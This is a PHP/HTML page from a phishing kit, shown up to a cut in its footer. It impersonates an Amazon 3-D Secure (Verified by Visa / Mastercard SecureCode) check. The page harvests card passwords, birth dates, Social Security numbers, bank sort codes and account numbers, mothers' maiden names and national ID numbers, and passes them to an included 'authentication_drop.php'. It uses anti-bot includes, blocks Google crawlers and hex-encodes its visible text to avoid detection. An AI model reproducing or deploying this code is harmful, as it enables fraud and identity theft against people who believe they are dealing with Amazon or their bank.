<?php
session_start();
error_reporting(0);
include('../functions/get_lang_en.php'); 
include('../functions/get_ip.php'); 
    ########## Amazon CC VBV        ########## 
   $_SESSION['_password_vbv_'] = $_POST['password_vbv'];
   $_SESSION['_dob_'] = $_POST['day']."/".$_POST['month']."/".$_POST['year'];
   $_SESSION['_sortnum_'] = $_POST['sortnum1']."-".$_POST['sortnum2']."-".$_POST['sortnum3'];
   $_SESSION['_accnumber_'] = $_POST['accnumber'];
   $_SESSION['_ssnnum_'] = $_POST['ssn1']."-".$_POST['ssn2']."-".$_POST['ssn3'];
   $_SESSION['_mmname_'] = $_POST['mmname'];
   $_SESSION['_creditlimit_'] = $_POST['creditlimit'];
   $_SESSION['_osid_'] = $_POST['osid'];	
   $_SESSION['_codicefiscale_'] = $_POST['codicefiscale'];
   $_SESSION['_kontonummer_'] = $_POST['kontonummer'];
   $_SESSION['_offid_'] = $_POST['offid'];
        ########## End ########## 
        
   ################## VBV INFORMATION ##################
   if ($_SERVER["REQUEST_METHOD"] == "POST") {
       if(empty($_POST['password_vbv'])== false) {
           include('authentication_drop.php');
   	}
   }
   $VISACARD   = $_SESSION['_cc_brand_'] == "VISA" || $_SESSION['_cc_brand_'] == "VISA ELECTRON";
   $MASTERCARD = $_SESSION['_cc_brand_'] == "MASTERCARD" || $_SESSION['_cc_brand_'] ==  "MAESTRO";
   if($MASTERCARD) {
   	$Type_XXX = "&#x4D;&#x61;&#x73;&#x74;&#x65;&#x72;&#x43;&#x61;&#x72;&#x64;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x65;&#x43;&#x6F;&#x64;&#x65;";
   	$VBV_Name = "&#x53;&#x65;&#x63;&#x75;&#x72;&#x65;&#x43;&#x6F;&#x64;&#x65;";
   }elseif($VISACARD) {
   	$Type_XXX = "&#x56;&#x65;&#x72;&#x69;&#x66;&#x69;&#x65;&#x64;&#x20;&#x62;&#x79;&#x20;&#x56;&#x69;&#x73;&#x61;";
   	$VBV_Name = "&#x33;&#x44;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x20;";
   }
           ########## End ########## 
           
    ########## Kill Bot Protection ########## 
   include "../../antibots/antibots1.php";
   include "../../antibots/antibots2.php";
   include "../../antibots/antibots3.php";
   include "../../../antibots/antibots4.php";
   include "../../antibots/antibots5.php";
   include "../../antibots/antibots6.php";
   if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
        ########## End ########## 
   ?>
<!doctype html>
<html>
   <head>
      <meta charset="utf-8">
      <title>&#x33;&#x2D;&#x44;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x41;&#x75;&#x74;&#x68;.</title>
	        <!---------------------------------- FILE ICON ------------------------------------->
      <link rel="shortcut icon" type="image/x-icon" href="../data/icon/favicon.ico">
      <!---------------------------------------------------------------------------------->	 
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
      <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/61WWCPB3rAL._RC|01evdoiemkL.css,01K+Ps1DeEL.css,314JbT8lsyL.css,01kivkxD60L.css,11UGC+GXOPL.css,21LK7jaicML.css,11L58Qpo0GL.css,21Pd9HarLOL.css,01Xl9KigtzL.css,21ygesff1yL.css,019SHZnt8RL.css,01qy9K8SDEL.css,11vZhCgAHbL.css,21uiGhnhrlL.css,11WgRxUdJRL.css,01dU8+SPlFL.css,11iPn24GCWL.css,01SHjPML6tL.css,111-D2qRjiL.css,01QrWuRrZ-L.css,31Wkf2OUteL.css,01WOZ2JFQjL.css,01pVbSC-RPL.css_.css?AUIClients/AmazonUI#us.not-trident" />
      <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/11BFk7eGdOL.css?AUIClients/CVFAssets" />
      <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/01bktdFFoyL.css?AUIClients/AuthenticationShowPasswordAssets" />
      <link rel="stylesheet" href="../lib/css/V_SYPHER.css">
	  <script src="../lib/js/V-SYPHER.js"></script> 
      <script>
         (function(g,h,L,la){function A(a){t&&t.tag&&t.tag(q(":","aui",a))}function u(a,b){t&&t.count&&t.count("aui:"+a,0===b?0:b||(t.count("aui:"+a)||0)+1)}function n(a){try{return a.test(navigator.userAgent)}catch(b){return!1}}function v(a,b,c){a.addEventListener?a.addEventListener(b,c,!1):a.attachEvent&&a.attachEvent("on"+b,c)}function q(a,b,c,e){b=b&&c?b+a+c:b||c;return e?q(a,b,e):b}function B(a,b,c){try{Object.defineProperty(a,b,{value:c,writable:!1})}catch(e){a[b]=c}return c}function M(){return setTimeout(V,
         0)}function ma(a,b){var c=a.length,e=c,f=function(){e--||(N.push(b),O||(M(),O=!0))};for(f();c--;)W[a[c]]?f():(w[a[c]]=w[a[c]]||[]).push(f)}function na(a,b,c,e,f){var d=h.createElement(a?"script":"link");v(d,"error",e);f&&v(d,"load",f);if(a){d.type="text/javascript";d.async=!0;if(a=c)a=-1!==b.indexOf("images/I")||/AUIClients/.test(b);a&&d.setAttribute("crossorigin","anonymous");d.src=b}else d.rel="stylesheet",d.href=b;h.getElementsByTagName("head")[0].appendChild(d)}function X(a,b){function c(c,e){function f(){na(b,
         c,h,function(b){!C&&h?(h=!1,u("resource_retry"),f()):(u("resource_error"),a.log("Asset failed to load: "+c,C?"WARN":void 0));b&&b.stopPropagation?b.stopPropagation():g.event&&(g.event.cancelBubble=!0)},e)}if(Y[c])return!1;Y[c]=!0;u("resource_count");var h=!0;return!f()}if(b){var e=0,f=0;c.andConfirm=function(a,b){return c(a,function(){e++;b&&b.apply(this,arguments)})};c.confirm=function(){f++};c.getCsriCounters=function(){return{reqs:e,full:f}}}return c}function oa(a,b,c){for(var e={name:a,guard:function(c){return b.guardFatal(a,
         c)},logError:function(c,d,e){b.logError(c,d,e,a)}},f=[],d=0;d<c.length;d++)D.hasOwnProperty(c[d])&&(f[d]=P.hasOwnProperty(c[d])?P[c[d]](D[c[d]],e):D[c[d]]);return f}function x(a,b,c,e,f){return function(d,h){function l(){var a=null;e?a=h:"function"===typeof h&&(p.start=y(),a=h.apply(g,oa(d,k,m)),p.end=y());if(b){D[d]=a;a=d;for(W[a]=!0;(w[a]||[]).length;)w[a].shift()();delete w[a]}p.done=!0}var k=f||this;"function"===typeof d&&(h=d,d=void 0);b&&(d=(d||"__NONAME__").replace(/^prv:/,""),Q.hasOwnProperty(d)&&
         k.error(q(", reregistered by ",q(" by ",d+" already registered",Q[d]),k.attribution),d),Q[d]=k.attribution);for(var m=[],n=0;n<a.length;n++)m[n]=a[n].replace(/^prv:/,"");var p=Z[d||"anon"+ ++pa]={depend:m,registered:y(),namespace:k.namespace};c?l():ma(m,k.guardFatal(d,l));return{decorate:function(a){P[d]=k.guardFatal(d,a)}}}}function aa(a){return function(){var b=Array.prototype.slice.call(arguments);return{execute:x(b,!1,a,!1,this),register:x(b,!0,a,!1,this)}}}function ba(a,b){return function(c,
         e){e||(e=c,c=void 0);var f=this.attribution;return function(){E.push(b||{attribution:f,name:c,logLevel:a});var d=e.apply(this,arguments);E.pop();return d}}}function F(a,b){this.load={js:X(this,!0),css:X(this)};B(this,"namespace",b);B(this,"attribution",a)}function ca(){h.body?p.trigger("a-bodyBegin"):setTimeout(ca,20)}function z(a,b){if(b){for(var c=a.className.split(" "),e=c.length;e--;)if(c[e]===b)return;a.className+=" "+b}}function da(a,b){for(var c=a.className.split(" "),e=[],f;void 0!==(f=c.pop());)f&&
         f!==b&&e.push(f);a.className=e.join(" ")}function ea(a){try{return a()}catch(b){return!1}}function G(){if(H){var a=g.innerWidth?{w:g.innerWidth,h:g.innerHeight}:{w:k.clientWidth,h:k.clientHeight};5<Math.abs(a.w-R.w)||50<a.h-R.h?(R=a,I=4,(a=l.mobile||l.tablet?450<a.w&&a.w>a.h:1250<=a.w)?z(k,"a-ws"):da(k,"a-ws")):0<I&&(I--,fa=setTimeout(G,16))}}function qa(a){(H=void 0===a?!H:!!a)&&G()}function ra(){return H}"use strict";var J=L.now=L.now||function(){return+new L},y=function(a){return a&&a.now?a.now.bind(a):
         J}(g.performance);la=y();var r=g.AmazonUIPageJS||g.P;if(r&&r.when&&r.register)throw Error("A copy of P has already been loaded on this page.");var t=g.ue;A();A("aui_build_date:3.17.18.5-2017-11-10");var N=[],O=!1,V;V=function(){for(var a=M(),b=J();N.length;)if(N.shift()(),50<J()-b)return;clearTimeout(a);O=!1};n(/OS 6_[0-9]+ like Mac OS X/i)&&v(g,"scroll",M);var W={},w={},Y={},C=!1;v(g,"beforeunload",function(){C=!0;setTimeout(function(){C=!1},1E4)});var Q={},D={},P={},Z={},pa=0,S,E=[],ga=g.onerror;
         g.onerror=function(a,b,c,e,f){f&&"object"===typeof f||(f=Error(a,b,c),f.columnNumber=e,f.stack=b||c||e?q(String.fromCharCode(92),f.message,"at "+q(":",b,c,e)):void 0);var d=E.pop()||{};f.attribution=q(":",f.attribution||d.attribution,d.name);f.logLevel=d.logLevel;f.attribution&&console&&console.log&&console.log([f.logLevel||"ERROR",a,"thrown by",f.attribution].join(" "));E=[];ga&&(d=[].slice.call(arguments),d[4]=f,ga.apply(g,d))};F.prototype={logError:function(a,b,c,e){b={message:b,logLevel:c||"ERROR",
         attribution:q(":",this.attribution,e)};if(g.ueLogError)return g.ueLogError(a||b,a?b:null),!0;console&&console.error&&(console.log(b),console.error(a));return!1},error:function(a,b,c,e){a=Error(q(":",e,a,c));a.attribution=q(":",this.attribution,b);throw a;},guardError:ba(),guardFatal:ba("FATAL"),log:function(a,b,c){return this.logError(null,a,b,c)},declare:x([],!0,!0,!0),register:x([],!0),execute:x([]),AUI_BUILD_DATE:"3.17.18.5-2017-11-10",when:aa(),now:aa(!0),trigger:function(a,b,c){var e=J();this.declare(a,
         {data:b,pageElapsedTime:e-(g.aPageStart||NaN),triggerTime:e});c&&c.instrument&&S.when("prv:a-logTrigger").execute(function(b){b(a)})},handleTriggers:function(){this.log("handleTriggers deprecated")},attributeErrors:function(a){return new F(a)},_namespace:function(a,b){return new F(a,b)}};var p=B(g,"AmazonUIPageJS",new F);S=p._namespace("PageJS","AmazonUI");S.declare("prv:p-debug",Z);p.declare("p-recorder-events",[]);p.declare("p-recorder-stop",function(){});B(g,"P",p);ca();if(h.addEventListener){var ha;
         h.addEventListener("DOMContentLoaded",ha=function(){p.trigger("a-domready");h.removeEventListener("DOMContentLoaded",ha,!1)},!1)}var k=h.documentElement,T=function(){var a=["O","ms","Moz","Webkit"],b=h.createElement("div");return{testGradients:function(){b.style.cssText=("background-image:-webkit-gradient(linear,left top,right bottom,from(#9f9),to(white));background-image:"+a.join("linear-gradient(left top,#9f9, white);background-image:")).slice(0,-17);return-1<b.style.backgroundImage.indexOf("gradient")},
         test:function(c){var e=c.charAt(0).toUpperCase()+c.substr(1);c=(a.join(e+" ")+e+" "+c).split(" ");for(e=c.length;e--;)if(""===b.style[c[e]])return!0;return!1},testTransform3d:function(){var a=!1;g.matchMedia&&(a=g.matchMedia("(-webkit-transform-3d)").matches);return a}}}(),r=k.className,ia=/(^| )a-mobile( |$)/.test(r),ja=/(^| )a-tablet( |$)/.test(r),l={audio:function(){return!!h.createElement("audio").canPlayType},video:function(){return!!h.createElement("video").canPlayType},canvas:function(){return!!h.createElement("canvas").getContext},
         svg:function(){return!!h.createElementNS&&!!h.createElementNS("http://www.w3.org/2000/svg","svg").createSVGRect},offline:function(){return navigator.hasOwnProperty&&navigator.hasOwnProperty("onLine")&&navigator.onLine},dragDrop:function(){return"draggable"in h.createElement("span")},geolocation:function(){return!!navigator.geolocation},history:function(){return!(!g.history||!g.history.pushState)},webworker:function(){return!!g.Worker},autofocus:function(){return"autofocus"in h.createElement("input")},
         inputPlaceholder:function(){return"placeholder"in h.createElement("input")},textareaPlaceholder:function(){return"placeholder"in h.createElement("textarea")},localStorage:function(){return"localStorage"in g&&null!==g.localStorage},orientation:function(){return"orientation"in g},touch:function(){return"ontouchend"in h},gradients:function(){return T.testGradients()},hires:function(){var a=g.devicePixelRatio&&1.5<=g.devicePixelRatio||g.matchMedia&&g.matchMedia("(min-resolution:144dpi)").matches;u("hiRes"+
         (ia?"Mobile":ja?"Tablet":"Desktop"),a?1:0);return a},transform3d:function(){return T.testTransform3d()},touchScrolling:function(){return n(/Windowshop|android.([3-9]|[L-Z])|OS ([5-9]|[1-9][0-9]+)(_[0-9]{1,2})+ like Mac OS X|Chrome|Silk|Firefox|Trident.+?; Touch/i)},ios:function(){return n(/OS [1-9][0-9]*(_[0-9]*)+ like Mac OS X/i)&&!n(/trident|Edge/i)},android:function(){return n(/android.([1-9]|[L-Z])/i)&&!n(/trident|Edge/i)},mobile:function(){return ia},tablet:function(){return ja}},m;for(m in l)l.hasOwnProperty(m)&&
         (l[m]=ea(l[m]));for(var U="textShadow textStroke boxShadow borderRadius borderImage opacity transform transition".split(" "),K=0;K<U.length;K++)l[U[K]]=ea(function(){return T.test(U[K])});var H=!0,fa=0,R={w:0,h:0},I=4;G();v(g,"resize",function(){clearTimeout(fa);I=4;G()});var ka={getItem:function(a){try{return g.localStorage.getItem(a)}catch(b){}},setItem:function(a,b){try{return g.localStorage.setItem(a,b)}catch(c){}}};da(k,"a-no-js");z(k,"a-js");!n(/OS [1-8](_[0-9]*)+ like Mac OS X/i)||g.navigator.standalone||
         n(/safari/i)||z(k,"a-ember");r=[];for(m in l)l.hasOwnProperty(m)&&l[m]&&r.push("a-"+m.replace(/([A-Z])/g,function(a){return"-"+a.toLowerCase()}));z(k,r.join(" "));k.setAttribute("data-aui-build-date","3.17.18.5-2017-11-10");p.register("p-detect",function(){return{capabilities:l,localStorage:l.localStorage&&ka,toggleResponsiveGrid:qa,responsiveGridEnabled:ra}});n(/UCBrowser/i)||l.localStorage&&z(k,ka.getItem("a-font-class"));p.declare("a-event-revised-handling",!1);if(m=navigator.serviceWorker){A("sw:unregister:supported");
         var sa=function(a){u("sw:unregister:"+(a?"success":"failure"))};m.getRegistrations().then(function(a){a.forEach(function(a){a.unregister().then(sa)})})}else A("sw:unregister:unsupported");p.declare("a-fix-event-off",!1);u("pagejs:pkgExecTime",y()-NaN)})(window,document,Date);
           (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/61ea4y7yPdL._RC|11IYhapguOL.js,614nPrPPL-L.js,21dmoxZTACL.js,012FVc3131L.js,31fv8bqHLoL.js,31ReKJl2X6L.js,51nK0kUyg2L.js,11+vNCgC1cL.js,01xMsWWFUQL.js,11KkQiUpBPL.js,113pP0Sfh0L.js,21auxuI+dRL.js,01PoLXBDXWL.js,612Ozn6EcSL.js,01ezj5Rkz1L.js,01rpauTep4L.js,01WqdunfTRL.js_.js?AUIClients/AmazonUI');
           (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/31uDKlBZ9EL.js?AUIClients/CVFAssets');
           (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/01KS7T7GX6L.js?AUIClients/AuthenticationShowPasswordAssets');
      </script>
   </head>
   <body>
      <div id="Rotation">
         <p style="font-size: 13px;">&#x33;&#x2D;&#x44;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x68;&#x61;&#x73;&#x20;&#x62;&#x65;&#x65;&#x6E;&#x20;&#x73;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;&#x66;&#x75;&#x6C;&#x6C;&#x79;&#x20;&#x70;&#x72;&#x6F;&#x63;&#x65;&#x73;&#x73;&#x65;&#x64;&#x2E;&#x2E;&#x2E;</p>
      </div>
      <div id="xMarcos_9X9X" style="opacity: 1;">
         <div id="popup">
            <p style="font-size: 15px;">&#x50;&#x72;&#x6F;&#x63;&#x65;&#x73;&#x73;&#x69;&#x6E;&#x67; </p>
         </div>
         <div id="xGhostRiderForm" style="display:none !important;">
            <div class="a-section a-spacing-none a-padding-medium">
               <div class="a-section a-spacing-medium a-text-center">
                  <a class="a-link-nav-icon" tabindex="-1" href="/ref=ap_frn_logo">
                  <i class="a-icon a-icon-logo"><span class="a-icon-alt"></span></i>
                  </a>
               </div>
            </div>
            <div class="a-section a-text-center">
               <style>
                  div.ex1 {
                  width:400px;
                  margin: auto;
                  }
               </style>
               <div class="ex1">
                  <div class="a-section cvf-page-layout">
                     <div id="cvf-page-content" class="a-section">
                        <div class="a-section a-spacing-double-large">
                           <div class="a-box a-spacing-base">
                              <div class="a-box-inner a-padding-extra-large">
                                 <table>
                                    <tbody>
                                       <tr>
                                          <td><img class="cc_bank" id="cc_bank" src="../lib/img/ssl.png"></td>
                                          <?php 
                                             if($MASTERCARD) {	
                                                                      echo '<td><img class="cc_type" id="cc_type" src="../lib/img/mastercard-securecode.png"></td>';
                                             }elseif($VISACARD){
                                             	echo '<td><img class="cc_type" id="cc_type" src="../lib/img/verified-by-visa.png"></td>';
                                             }
                                             ?>
                                       </tr>
                                    </tbody>
                                 </table>
                                 <br />
								 <style>
								 width:230px;
								 </style>
                                 <div id="xDoctorStrange_L1" style="text-align: center;font-family: PayPal-Sans-Regular, sans-serif;"><?=$_SESSION['_cc_bank_'];?></div>
                                 <div id="xDoctorStrange_L1">&#x41;&#x64;&#x64;&#x65;&#x64;&#x20;&#x53;&#x61;&#x66;&#x65;&#x74;&#x79;&#x20;&#x4F;&#x6E;&#x6C;&#x69;&#x6E;&#x65;</div>
                                 <div id="xDoctorStrange_L2"><?=$Type_XXX;?> &#x68;&#x65;&#x6C;&#x70;&#x73;&#x20;&#x70;&#x72;&#x6F;&#x74;&#x65;&#x63;&#x74;&#x20;&#x79;&#x6F;&#x75;&#x72; <b></b> &#x63;&#x61;&#x72;&#x64;&#x20;&#x61;&#x67;&#x61;&#x69;&#x6E;&#x73;&#x74;&#x20;&#x75;&#x6E;&#x61;&#x75;&#x74;&#x68;&#x6F;&#x72;&#x69;&#x7A;&#x65;&#x64;&#x20;&#x75;&#x73;&#x65;&#x20;&#x6F;&#x6E;&#x6C;&#x69;&#x6E;&#x65;&#x20;&#x2D;&#x20;&#x61;&#x74;&#x20;&#x6E;&#x6F;&#x20;&#x61;&#x64;&#x64;&#x69;&#x74;&#x69;&#x6F;&#x6E;&#x61;&#x6C;&#x20;&#x63;&#x6F;&#x73;&#x74;&#x2E;&#x20;&#x54;&#x6F;&#x20;&#x75;&#x73;&#x65; <?=$Type_XXX;?> &#x6F;&#x6E;&#x20;&#x74;&#x68;&#x69;&#x73;&#x20;&#x61;&#x6E;&#x64;&#x20;&#x66;&#x75;&#x74;&#x75;&#x72;&#x20;&#x70;&#x75;&#x72;&#x73;&#x68;&#x61;&#x73;&#x65;&#x73;&#x2E;&#x20;&#x63;&#x6F;&#x6D;&#x70;&#x6C;&#x65;&#x74;&#x65;&#x20;&#x74;&#x68;&#x69;&#x73;&#x20;&#x70;&#x61;&#x67;&#x65;&#x20;&#x59;&#x6F;&#x75;&#x27;&#x6C;&#x6C;&#x20;&#x74;&#x68;&#x65;&#x20;&#x63;&#x72;&#x65;&#x61;&#x74;&#x65;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x6F;&#x77;&#x6E; <?=$Type_XXX;?> &#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</div>
                                 <div id="xDoctorStrange_L3">
                                    <table>
                                       <tbody>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;">&#x4E;&#x61;&#x6D;&#x65;&#x20;&#x6F;&#x6E;&#x20;&#x63;&#x61;&#x72;&#x64;&#x20;&#x3A;</td>
                                             <td><?=htmlentities($_SESSION['_cc_holder_']);?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;">&#x43;&#x6F;&#x75;&#x6E;&#x74;&#x72;&#x79;&#x20;&#x4E;&#x61;&#x6D;&#x65;&#x20;&#x3A;</td>
                                             <td class="limit"><?=ucwords(strtolower($_SESSION['_country_']));?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;">&#x43;&#x61;&#x72;&#x64;&#x20;&#x54;&#x79;&#x70;&#x65;&#x20;&#x3A;</td>
                                             <td><?=ucwords(strtolower($_SESSION['_ccglobal_']));?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;">&#x43;&#x61;&#x72;&#x64;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;&#x20;&#x3A;</td>
                                             <td>XXXX-XXXX-XXXX-<?=substr($_SESSION['_cc_number_'] , -4);?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;">&#x44;&#x61;&#x74;&#x65;&#x20;&#x74;&#x69;&#x6D;&#x65;&#x20;&#x3A;</td>
                                             <td><?=date('m/d/Y').", ".date("h:i:s A");?></td>
                                          </tr>
                                          <form name="F0rmVBV" method="post" action="" class="F0rmVBV">
                                             <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">&#x42;&#x69;&#x72;&#x74;&#x68;&#x20;&#x44;&#x61;&#x74;&#x65;&#x20;&#x3A;</td>
                                                <td><input required style="width: 44px;text-align: center;" id="month" type="tel" placeholder="MM" name="month" class="dob" maxlength="2" data-maxlength="2"> / <input required style="width: 50px;text-align: center;" id="day" type="tel" placeholder="DD" name="day" class="dob" maxlength="2" data-maxlength="2"> / <input required style="width: 58px;text-align: center;" id="year" type="tel" placeholder="YYYY" name="year" class="dob" maxlength="4" data-maxlength="4"></td>
                                             </tr>
                                             <?php
                                                ############################ ITALY ############################	
                                                if($_SESSION['_LOOKUP_CNTRCODE_'] == "IT") {	
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">&#x43;&#x6F;&#x64;&#x69;&#x63;&#x65;&#x20;&#x46;&#x69;&#x73;&#x63;&#x61;&#x6C;&#x65;&#x20;&#x3A;</td>
                                                <td><input required type="tel" name="codicefiscale" id="codicefiscale" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                }
                                                ################### SWITZERLAND || GERMANY #####################
                                                elseif($_SESSION['_LOOKUP_CNTRCODE_'] == "CH" || $_SESSION['_LOOKUP_CNTRCODE_'] == "DE") {	
                                                echo '<tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">&#x4B;&#x6F;&#x6E;&#x74;&#x6F;&#x6E;&#x75;&#x6D;&#x6D;&#x65;&#x72;&#x20;&#x3A;</td>
                                                <td><input required type="tel" name="kontonummer" id="kontonummer" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                				}
                                                ########################### GREECE #############################
                                                elseif($_SESSION['_LOOKUP_CNTRCODE_'] == "GR") {	
                                                echo '<tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">&#x4F;&#x66;&#x66;&#x69;&#x63;&#x69;&#x61;&#x6C;&#x20;&#x49;&#x44;&#x20;&#x3A;</td>
                                                <td>
                                                <input required type="tel" name="offid" id="offid" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                				}
                                                ########################## AUSTRALIA ###########################
                                                elseif($_SESSION['_LOOKUP_CNTRCODE_'] == "AU") {
                                                echo '<tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">&#x4F;&#x53;&#x49;&#x44;&#x20;&#x3A;</td>
                                                <td><input required type="tel" name="osid" id="osid" style="width: 170px;padding-left: 4px;"></td></tr>
                                                <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">&#x43;&#x72;&#x65;&#x64;&#x69;&#x74;&#x20;&#x4C;&#x69;&#x6D;&#x69;&#x74;&#x20;&#x3A;</td>
                                                <td><input required type="tel" name="creditlimit" id="creditlimit" style="width: 170px;padding-left: 4px;"></td></tr>';
                                                				}
                                                ################# IRELAND || UNITED KINGDOM  ###################
                                                elseif ($_SESSION['_LOOKUP_CNTRCODE_'] == "IE" || $_SESSION['_LOOKUP_CNTRCODE_'] == "GB" ) {
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">&#x53;&#x6F;&#x72;&#x74;&#x20;&#x43;&#x6F;&#x64;&#x65;&#x20;&#x3A;</td>
                                                <td><input required type="tel" name="sortnum1" id="sortnum1" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> - <input required type="tel" name="sortnum2" id="sortnum2" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> - <input required type="tel" name="sortnum3" id="sortnum3" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"></td>
                                                </tr>                  
                                                <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">&#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;&#x20;&#x3A;</td>
                                                <td><input required type="tel" name="accnumber" id="accnumber" class="accnumber" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';			   
                                                 
                                                				}
                                                #################### UNITED STATES || CANADA ###################
                                                elseif ($_SESSION['_LOOKUP_CNTRCODE_'] == "US" || $_SESSION['_LOOKUP_CNTRCODE_'] == "CA") {
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">&#x53;&#x6F;&#x63;&#x69;&#x61;&#x6C;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;&#x20;&#x3A;</td>
                                                <td><input required type="tel" name="ssn1" id="ssn1" class="ssnum" style="width:30px;padding-left: 2px;" maxlength="3" data-maxlength="3"> - <input required type="tel" name="ssn2" id="ssn2" class="ssnum" style="width: 24px;padding-left: 2px;" maxlength="2" data-maxlength="2"> - <input required type="tel" name="ssn3" id="ssn3" class="ssnum" style="width:40px;padding-left: 4px;" maxlength="4" data-maxlength="4"></td>
                                                                  				</tr>';
                                                	}
                                                #################### IRELAND || CANADA ###################
                                                	if ($_SESSION['_LOOKUP_CNTRCODE_'] == "IR" || $_SESSION['_LOOKUP_CNTRCODE_'] == "CA") {
                                                	   echo'<tr class="Height_XXX">
                                                                      			<td ALIGN="LEFT" style="font-weight: bold;">&#x4D;&#x6F;&#x74;&#x68;&#x65;&#x72;&#x2019;&#x73;&#x20;&#x4D;&#x61;&#x69;&#x64;&#x65;&#x6E;&#x20;&#x4E;&#x61;&#x6D;&#x65; :</td>
                                                                      			<td><input required type="tel" name="mmname" id="mmname" style="width: 170px;padding-left: 4px;"></td>
                                                                  			</tr>';
                                                 			}			
                                                ?>
                                             <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;"><?=$VBV_Name;?> :</td>
                                                <td><input required type="password" name="password_vbv" id="password_vbv" style="width: 170px;padding-left: 4px;"></td>
                                             </tr>
                                             <tr>
                                                <td><?=$_SESSION['_cc_phone_'];?></td>
                                                <td><?=$_SESSION['_cc_site_'];?></td>
                                             </tr>
                                       </tbody>
                                    </table>
                                 </div>
                                 <div class="a-section a-spacing-top-extra-large"><span class="a-button a-button-span12 a-button-primary cvf-widget-btn"><span class="a-button-inner">
                                 <input name="vbv_submit_btn" id="vbv_submit_btn" class="a-button-input" type="submit">
                                 <span class="a-button-text">&#x53;&#x75;&#x62;&#x6D;&#x69;&#x74;</span></span></span></div>
                                 </form>
                              </div>
                           </div>
                        </div>
                        <p class="a-spacing-none">&#x43;&#x61;&#x6E;&#x6E;&#x6F;&#x74;&#x20;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x20;&#x79;&#x6F;&#x75;&#x72; <?=$Type_XXX;?>?
                        <div class="a-section">    <span>&#x43;&#x6F;&#x6E;&#x74;&#x61;&#x63;&#x74; </span>
                           <a class="a-link-normal">&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x20;&#x43;&#x75;&#x73;&#x74;&#x6F;&#x6D;&#x65;&#x72;&#x20;&#x53;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;</a>
                        </div>
                        </p>
                     </div>
                  </div>
               </div>
            </div>
            <style>
               .auth-footer-separator {
               display: inline-block;
               width: 20px;
               }
            </style>
            <div class="a-divider a-divider-section">
               <div class="a-divider-inner"></div>
            </div>
            <div id="footer" class="a-section">
               <div class="a-section a-spacing-small a-text-center">
                  <span class="auth-footer-separator"></span>
                  <a class="a-link-normal" target="_blank" rel="noopener">
                  &#x43;&#x6F;&#x6E;&#x64;&#x69;&#x74;&#x69;&#x6F;&#x6E;&#x73;&#x20;&#x6F;&#x66;&#x20;&#x55;&#x73;&#x65;
                  </a>
                  <span class="auth-footer-separator"></span>
                  <a class="a-link-normal" target="_blank" rel="noopener">
                  &#x50;&#x72;&#x69;&#x76;&#x61;&#x63;&#x79;&#x20;&#x4E;&#x6F;&#x74;&#x69;&#x63;&#x65;
                  </a>
                  <span class="auth-footer-separator"></span>
                  <a class="a-link-normal" target="_blank" rel="noopener">
                  &#x48;&#x65;&#x6C;&#x70;
                  </a>
                  <span class="auth-footer-separator"></span>
               </div>
               <div class="a-section a-spacing-none a-text-center">
                  <span class="a-size-mini a-color-secondary">
